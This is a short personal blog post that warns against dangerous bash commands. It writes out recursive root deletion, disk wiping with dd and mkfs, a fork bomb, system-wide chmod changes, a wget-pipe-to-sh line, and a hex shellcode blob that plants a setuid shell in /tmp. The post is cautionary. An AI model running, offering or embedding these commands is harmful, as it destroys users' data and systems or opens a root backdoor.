---
title: Bash deadly commands
date: 2014-03-23
tags:
  - shell
  - linux
  - security
categories:
  - base_commands
author_profile: true
draft: false
comments: false
slug: bash-deadly-commands
---

This is a list of dangerous commands you should never use and you should make sure are not into some script you downloaded from internet before using it. As similar list are all over the place in internet, is difficult to credit ownership to someone. I collected them from different sources for my personal record and easyness of use.

_Note_ that some need root priviledges to be run (starting with `#`) while others do not (starting with `$`).

### 1. Destroy everything

Remove recursively everything starting from the `/` folder or your home `~`. In the latter case user permissions are enough.

```bash
# ! Requires root priviledges
~# rm -rf /
~# rm -rf /*
~# rm -rf *

# ! Does NOT require root priviledges
~$ rm -rf ~
```

### 2. Destroy everything (hex version)

Like the former but in exadecimal. Very dangerous since can be put in a script and if you don't recognize it you could have a lot of troubles.

```bash
char esp[] __attribute__ ((section(".text"))) /* e.s.p release */
= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
"cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;";
```

### 3. New filesystem

To create a new filesystem on a partition automatically destroys everything on it. Needs root proviledges.

```bash
~# mkfs -t ext4 /dev/sda2
```

### 4. Forkbomb

It creates recursively new instances of itself until the system freezes. The problem can be solved simply hard rebooting the whole system. Not really a huge problem on your laptop, but a system administrator on a server won't be happy.

```bash
~$ :(){:|:&};:
```

### 5. Output to filesystem

Overwrites the data on a filesystem with the output of the command command. The overwritten data are unrecoverable.

```bash
~# command > /dev/sda2
```

### 6. Download and execute

Never download and execute script from untrusted sources without checking them carefully before.

```bash
~$ wget http://whatever.org/file -O - | sh
```

### 7. Send to nowhere

Moves something to null, the big void. Your data will simply evaporates.

```bash
~$ mv /path/folder /dev/null
```

### 8. Wipe the disk

This covers the disk with zeros from the zeros. Corresponds to a low level formatting.

```bash
~# dd if=/dev/zero of=/dev/sda
```

### 9. Wipe the disk (version 2)

Like the former but with random data instead of zeros.

```bash
~# dd if=/dev/urandom of=/dev/sda
```

### 10. Doors open

Gives all the permissions to everybody on the whole system recursively. Not really good on your laptop, destructive on a server.

```bash
~# chmod -R 777 /
```

### 11. History

It executes again everything is in the history. Imagine your system re-executing the 1000000 commands you have stored in your history, moving, creating, deleting. It will be long to fix the mess.

```bash
~$ source ~/.bash_history
```

### 12. Permissions blackhole

Makes everything non executable. Not a single binary will be executable any more. Neither the `chmod` one...

```bash
~# chmod -R -x /
```
